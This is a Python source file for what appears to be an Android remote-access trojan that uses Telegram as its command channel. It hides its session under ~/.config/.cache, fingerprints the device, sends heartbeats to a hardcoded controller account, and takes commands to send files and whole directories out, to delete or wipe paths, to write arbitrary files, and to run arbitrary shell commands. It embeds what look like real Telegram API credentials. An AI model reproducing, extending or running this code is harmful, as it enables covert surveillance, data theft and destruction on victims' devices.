import asyncio
import os
import subprocess
import sys
import traceback
import random
import string
import shutil
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError

API_ID = 3910389
API_HASH = '86f861352f0ab76a251866059a6adbd6'
SESSION_PATH = os.path.expanduser('~/.config/.cache/client.session')
CONTROLLER_USERNAME = 'mc_abel'
HEARTBEAT_INTERVAL = 60
ID_FILE = os.path.expanduser('~/.config/.cache/device_id.txt')

client = TelegramClient(SESSION_PATH, API_ID, API_HASH)
CONTROLLER_ENTITY = None
DEVICE_ID = "UNKNOWN"
DEVICE_MODEL = "UNKNOWN"
CANCEL_PULL = asyncio.Event()

def get_device_info():
    global DEVICE_ID, DEVICE_MODEL
    try:
        if os.path.exists(ID_FILE):
            with open(ID_FILE, 'r') as f:
                saved_id = f.read().strip()
                if saved_id and saved_id != "P-err" and saved_id != "UNKNOWN":
                    DEVICE_ID = saved_id
    except Exception:
        pass

    if DEVICE_ID == "UNKNOWN" or DEVICE_ID == "P-err":
        and_id = ""
        try:
            and_id = subprocess.check_output(['/system/bin/settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL).decode().strip()
        except Exception:
            pass
        
        if not and_id or and_id.startswith('Exception') or and_id == 'null' or len(and_id) < 4:
            try:
                and_id = subprocess.check_output(['settings', 'get', 'secure', 'android_id'], stderr=subprocess.DEVNULL).decode().strip()
            except Exception:
                pass
                
        if not and_id or and_id.startswith('Exception') or and_id == 'null' or len(and_id) < 4:
            and_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        
        DEVICE_ID = f"P-{and_id[:4]}"
        try:
            with open(ID_FILE, 'w') as f:
                f.write(DEVICE_ID)
        except Exception:
            pass
            
    try:
        model = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
        if not model:
            model = subprocess.check_output(['getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip()
        DEVICE_MODEL = model if model and not model.startswith('Exception') else "Unknown"
    except Exception:
        DEVICE_MODEL = "Unknown"

async def resolve_controller():
    global CONTROLLER_ENTITY
    try:
        CONTROLLER_ENTITY = await client.get_entity(CONTROLLER_USERNAME)
    except Exception:
        CONTROLLER_ENTITY = None

async def heartbeat():
    while True:
        await asyncio.sleep(HEARTBEAT_INTERVAL)
        if CONTROLLER_ENTITY is None:
            await resolve_controller()
        if CONTROLLER_ENTITY:
            try:
                msg = f"🟢 ACTIVE • {DEVICE_ID} • {DEVICE_MODEL}"
                await client.send_message(CONTROLLER_ENTITY, msg)
            except Exception:
                pass

async def safe_send_file(target, path):
    try:
        await client.send_file(target, path)
        await asyncio.sleep(2) # Delay to prevent flood
    except FloodWaitError as e:
        await client.send_message(target, f'[{DEVICE_ID}] FloodWait: Sleeping for {e.seconds}s')
        await asyncio.sleep(e.seconds)
    except Exception as e:
        await client.send_message(target, f'[{DEVICE_ID}] ERROR sending {path}: {e}')

@client.on(events.NewMessage)
async def handler(event):
    if CONTROLLER_ENTITY and event.sender_id == CONTROLLER_ENTITY.id:
        text = event.raw_text.strip()
        
        if not (text.startswith(DEVICE_ID) or text.startswith('*')):
            return
            
        parts = text.split(' ', 1)
        if len(parts) < 2:
            return
            
        cmd_text = parts[1].strip()
        
        if cmd_text == '/dd':
            details = get_full_details()
            await client.send_message(CONTROLLER_ENTITY, details)
            
        elif cmd_text == 'CANCEL':
            CANCEL_PULL.set()
            await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Pull operation cancelled.')

        elif cmd_text.startswith('PULL '):
            path = cmd_text[5:].strip()
            if os.path.isfile(path):
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Pulling file: {path}')
                await safe_send_file(CONTROLLER_ENTITY, path)
            else:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: File {path} not found')

        elif cmd_text.startswith('PULL_DIR '):
            path = cmd_text[9:].strip()
            if os.path.isdir(path):
                CANCEL_PULL.clear()
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Starting directory pull: {path}')
                try:
                    files = os.listdir(path)
                    for f in files:
                        if CANCEL_PULL.is_set():
                            await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Pull halted by user.')
                            break
                        full_path = os.path.join(path, f)
                        if os.path.isfile(full_path):
                            await safe_send_file(CONTROLLER_ENTITY, full_path)
                    else:
                        await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Directory pull complete.')
                except Exception as e:
                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR pulling dir: {e}')
            else:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Directory {path} not found')

        elif cmd_text.startswith('DELETE '):
            path = cmd_text[7:].strip()
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: deleted {path}')
            except Exception as e:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')

        elif cmd_text.startswith('CLEAR '):
            path = cmd_text[6:].strip()
            if os.path.isdir(path):
                CANCEL_PULL.clear()
                try:
                    items = os.listdir(path)
                    for item in items:
                        if CANCEL_PULL.is_set():
                            await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Clear halted by user.')
                            break
                        full_path = os.path.join(path, item)
                        if os.path.isdir(full_path):
                            shutil.rmtree(full_path)
                        else:
                            os.remove(full_path)
                    else:
                        await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: cleared contents of {path}')
                except Exception as e:
                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
            else:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Directory not found')

        elif cmd_text.startswith('CREATE '):
            # Format: CREATE /path/to/file|content here
            payload = cmd_text[7:].strip()
            if '|' in payload:
                path, content = payload.split('|', 1)
                path = path.strip()
                try:
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    with open(path, 'w') as f:
                        f.write(content.strip())
                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: created {path}')
                except Exception as e:
                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
            else:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Missing | separator')

        elif cmd_text.startswith('EXEC '):
            cmd = cmd_text[5:].strip()
            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                out, _ = proc.communicate()
                output_text = out.decode() if out else "No output."
                if len(output_text) > 4000:
                    output_text = output_text[:4000] + "\n... [TRUNCATED]"
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OUTPUT:\n{output_text}')
            except Exception as e:
                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')

async def main():
    get_device_info()
    await client.start()
    await resolve_controller()
    asyncio.create_task(heartbeat())
    await client.run_until_disconnected()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        traceback.print_exc()
